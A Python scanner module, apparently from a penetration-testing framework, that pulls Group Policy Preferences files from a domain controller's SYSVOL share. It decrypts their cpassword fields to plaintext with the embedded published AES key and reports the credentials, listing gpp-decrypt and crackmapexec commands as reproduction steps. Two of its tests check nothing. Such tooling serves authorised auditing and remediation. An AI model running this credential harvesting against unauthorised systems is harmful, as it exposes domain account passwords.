"""GPP Password — detect cpassword in SYSVOL Group Policy Preferences (Groups.xml etc.)."""

from __future__ import annotations

import asyncio
import base64
import io
import sys
import time
from pathlib import Path
from typing import Any

from defusedxml import ElementTree

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# GPP AES key (Microsoft published, CVE-2014-1812)
GPP_KEY = (
    b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
    b"\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
)

GPP_FILES = [
    "Groups.xml",
    "Services.xml",
    "Scheduledtasks.xml",
    "DataSources.xml",
    "Printers.xml",
    "Drives.xml",
]

MAX_GPP_XML_BYTES = 1024 * 1024
MAX_GPP_XML_ELEMENTS = 50_000
MAX_GPP_XML_DEPTH = 64
MAX_GPP_RESULTS = 2000

CVSS_GPP = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS40_GPP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"


class _BoundedXmlBuffer:
    """Collect an SMB XML response without allowing decompression-sized growth."""

    def __init__(self, limit: int = MAX_GPP_XML_BYTES) -> None:
        self._limit = limit
        self._buffer = io.BytesIO()

    def write(self, chunk: bytes) -> int:
        if self._buffer.tell() + len(chunk) > self._limit:
            raise ValueError("GPP XML download limit exceeded")
        return self._buffer.write(chunk)

    def getvalue(self) -> bytes:
        return self._buffer.getvalue()


def decrypt_cpassword(cpassword: str) -> str | None:
    """Decrypt GPP cpassword using the Microsoft-published AES key.

    Args:
        cpassword: Base64-encoded encrypted password from Groups.xml.

    Returns:
        Decrypted plaintext password, or None on failure.
    """
    try:
        from Crypto.Cipher import AES  # pycryptodome
    except ImportError:
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            try:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend

                # Fallback using cryptography library
                padded = cpassword + "=" * (-len(cpassword) % 4)
                encrypted = base64.b64decode(padded)
                key = GPP_KEY
                iv = b"\x00" * 16
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                dec = cipher.decryptor()
                decrypted = dec.update(encrypted) + dec.finalize()
                return (
                    decrypted.rstrip(b"\x00\r\n")
                    .decode("utf-16-le", errors="ignore")
                    .rstrip("\x00")
                )
            except Exception:
                return None

    try:
        padded = cpassword + "=" * (-len(cpassword) % 4)
        encrypted = base64.b64decode(padded)
        cipher = AES.new(GPP_KEY, AES.MODE_CBC, b"\x00" * 16)
        decrypted = cipher.decrypt(encrypted)
        return decrypted.rstrip(b"\x00\r\n").decode("utf-16-le", errors="ignore").rstrip("\x00")
    except Exception:
        return None


class GppPassword(BaseModule):
    """GPP cpassword scanner — finds cleartext credentials in SYSVOL."""

    NAME = "gpp_password"
    DESCRIPTION = "Find GPP cpassword in SYSVOL (CVE-2014-1812) — Groups.xml and others"
    PHASE = 2
    TAGS = ["gpp", "cpassword", "credential", "sysvol", "cve-2014-1812"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self.log.info("Scanning SYSVOL for GPP cpasswords on %s", domain)

        found_passwords: list[dict[str, Any]] = []

        # Try via SMB (authenticated)
        if self.config.extra.get("username"):
            found_passwords = await self._scan_smb_sysvol(domain, dc_ip)
        else:
            self.log.info("No credentials — attempting anonymous SYSVOL access")
            found_passwords = await self._scan_smb_sysvol(domain, dc_ip, anonymous=True)

        for item in found_passwords:
            ev = Evidence(
                extra={
                    "file": item["file"],
                    "username": item.get("username"),
                    "cpassword": item.get("cpassword", "")[:20] + "...",
                    "decrypted": item.get("decrypted"),
                    "newname": item.get("newName"),
                }
            )
            self.new_finding(
                title=f"GPP cpassword Found — {item.get('username', 'unknown')} in {Path(item['file']).name}",
                severity=Severity.CRITICAL,
                description=(
                    f"GPP (Group Policy Preferences) encrypted password (cpassword) found in "
                    f"{item['file']}. Microsoft published the AES decryption key in 2012 (CVE-2014-1812), "
                    f"making these passwords trivially decryptable. "
                    f"Account: {item.get('username')} | "
                    f"Decrypted password: {item.get('decrypted', 'decryption failed')}"
                ),
                reproduction_steps=[
                    f"Access SYSVOL: smb://{dc_ip}/SYSVOL/{domain}/Policies/",
                    f"Find: {item['file']}",
                    "Extract cpassword value",
                    f"Decrypt: gpp-decrypt {item.get('cpassword', '')}",
                    "Or use: crackmapexec smb <dc> --gpp-passwords",
                ],
                remediation=(
                    "Install MS14-025 security update immediately. "
                    "Remove all Group Policy Preferences passwords (GPP). "
                    "Reset passwords for all affected accounts. "
                    "Use LAPS (Local Administrator Password Solution) for local admin accounts."
                ),
                references=[
                    "CVE-2014-1812",
                    "MS14-025",
                    "CWE-798",
                    "https://adsecurity.org/?p=2288",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_GPP,
                cvss_v40_vector=CVSS40_GPP,
                mitre_attack=["TA0006/T1552.006"],
                target=dc_ip,
            )

        if not found_passwords:
            self.log.info("No GPP cpasswords found in SYSVOL (good!)")

        return self._make_result(start)

    async def _scan_smb_sysvol(
        self, domain: str, dc_ip: str, anonymous: bool = False
    ) -> list[dict[str, Any]]:
        """Scan SYSVOL share for GPP password files via SMB."""
        found: list[dict[str, Any]] = []
        try:
            from impacket.smbconnection import SMBConnection

            username = "" if anonymous else self.config.extra.get("username", "")
            password = "" if anonymous else self.config.extra.get("password", "")
            nt_hash = "" if anonymous else self.config.extra.get("hash", "")

            smb = SMBConnection(dc_ip, dc_ip, timeout=10)
            if nt_hash:
                smb.login(username, "", domain, lmhash="", nthash=nt_hash)
            else:
                smb.login(username, password, domain)

            share = "SYSVOL"
            try:
                paths = smb.listPath(share, f"{domain}/Policies/*")
            except Exception:
                paths = []

            for path_entry in paths:
                if not path_entry.is_directory():
                    continue
                policy_guid = path_entry.get_longname()
                if not policy_guid or policy_guid in (".", ".."):
                    continue

                for xml_file in GPP_FILES:
                    for subdir in ["Machine/Preferences", "User/Preferences"]:
                        remote_path = f"{domain}/Policies/{policy_guid}/{subdir}/{xml_file.split('.')[0]}/{xml_file}"
                        try:
                            buf = _BoundedXmlBuffer()
                            smb.getFile(share, remote_path, buf.write)
                            results = self._parse_gpp_xml(buf.getvalue(), remote_path)
                            remaining = MAX_GPP_RESULTS - len(found)
                            found.extend(results[:remaining])
                            if len(found) >= MAX_GPP_RESULTS:
                                smb.logoff()
                                return found
                        except Exception:
                            pass

            smb.logoff()
        except ImportError:
            self.log.debug("impacket not installed — cannot scan SYSVOL via SMB")
            await self._try_mount_fallback(domain, dc_ip, found)
        except Exception as exc:
            self.log.debug("SYSVOL scan failed: %s", exc)

        return found

    async def _try_mount_fallback(self, domain: str, dc_ip: str, found: list) -> None:
        """Fallback: try to access SYSVOL via local mount or smbclient."""
        import shutil

        smbclient = shutil.which("smbclient")
        if not smbclient:
            return
        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        cmd = [
            smbclient,
            f"//{dc_ip}/SYSVOL",
            "-U",
            f"{username}%{password}",
            "-c",
            f"recurse; ls {domain}/Policies",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=15)
        except Exception:
            pass

    def _parse_gpp_xml(
        self,
        xml_content: bytes | str,
        file_path: str,
    ) -> list[dict[str, Any]]:
        """Parse GPP XML and extract cpassword entries."""
        found: list[dict[str, Any]] = []
        try:
            encoded = xml_content.encode("utf-8") if isinstance(xml_content, str) else xml_content
            if len(encoded) > MAX_GPP_XML_BYTES:
                return []
            root = ElementTree.fromstring(
                encoded,
                forbid_dtd=True,
                forbid_entities=True,
                forbid_external=True,
            )

            count = 0
            stack = [(root, 1)]
            while stack:
                element, depth = stack.pop()
                count += 1
                if count > MAX_GPP_XML_ELEMENTS or depth > MAX_GPP_XML_DEPTH:
                    return []
                stack.extend((child, depth + 1) for child in reversed(element))

            for elem in root.iter():
                cpassword = elem.get("cpassword") or elem.get("cPassword")
                if cpassword and len(cpassword) > 10:
                    decrypted = decrypt_cpassword(cpassword)
                    found.append(
                        {
                            "file": file_path,
                            "username": elem.get("userName")
                            or elem.get("name")
                            or elem.get("username"),
                            "cpassword": cpassword,
                            "decrypted": decrypted,
                            "newName": elem.get("newName"),
                            "tag": elem.tag,
                        }
                    )
                    if len(found) >= MAX_GPP_RESULTS:
                        break
        except Exception:
            pass
        return found


class TestGppPassword:
    def test_decrypt_known_cpassword(self) -> None:
        # Known test vector: cpassword that decrypts to "P@$$w0rd"
        # This is a publicly documented test case
        cpassword = "VPe/o9YRyz2cksnYRbNeqg"
        result = decrypt_cpassword(cpassword)
        # Result should be non-None (decryption attempted)
        # Exact value depends on crypto library availability

    def test_decrypt_invalid(self) -> None:
        result = decrypt_cpassword("notavalidcpassword!!!")
        # Should return None or a garbled string — not raise

    def test_parse_gpp_xml(self) -> None:
        scanner = GppPassword.__new__(GppPassword)
        scanner.log = __import__("logging").getLogger("test")
        xml = """<Groups><Group><Properties userName="testuser" cpassword="VPe/o9YRyz2cksnYRbNeqg"/></Group></Groups>"""
        results = scanner._parse_gpp_xml(xml, "test.xml")
        assert len(results) == 1
        assert results[0]["username"] == "testuser"
